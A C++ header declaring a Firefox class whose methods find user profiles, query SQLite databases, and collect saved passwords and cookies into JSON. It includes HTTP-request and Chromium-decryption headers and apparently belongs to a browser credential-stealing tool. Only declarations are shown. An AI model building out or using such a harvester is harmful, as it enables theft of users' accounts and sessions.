#pragma once
#include <Windows.h>
#include <Shlobj.h>
#include <fstream>
#include "Browser.h"
#include <filesystem>
#include "sqlite3.h"
#include "HttpRequests.h"
#include "ChromiumDecrypt.h"

namespace Tool
{
	namespace Browsers
	{
		class Firefox : public Browser {
			std::vector <std::string> vUserProfilesPaths;
			bool GetUserProfilePath();
			bool ExecuteSqlCommand(sqlite3* db, std::string query);
			void GatherCookiesFromDb(int argc, char** argv, char** azColName);
			static int callback(void* data, int argc, char** argv, char** azColName);
			void GetCookiesFromCurrentDB(std::string sCurrentProfilePath);
		public:
			bool GatherRequiredDbFiles();
			Firefox(Tool::Configuration::config_t MainContext_t);
			void ExecuteAllModules(awesomejson::json& jFinalResults, Tool::Browsers::Browser& bBrowser) override;
			void GetUserPasswords(awesomejson::json& jLoginPasswords) override;
			void GetUserCookies(awesomejson::json& jFirefoxCookies) override;
		};
	}
}
